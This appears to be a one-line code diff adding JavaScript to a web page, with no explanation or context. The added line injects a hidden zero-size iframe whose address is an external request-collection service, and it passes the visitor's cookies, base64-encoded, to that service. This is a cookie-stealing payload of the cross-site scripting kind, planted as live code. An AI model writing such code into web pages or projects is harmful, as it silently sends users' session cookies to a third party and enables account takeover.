@@ -1,0 +1,1 @@
+document.getElementById('body').innerHTML += '<iframe id=\"iframe\" src=\"https://requestb.in/1l6grf71?plop=1&data='+btoa(document.cookie)+'\" width=\"0\" height=\"0\"></iframe>';
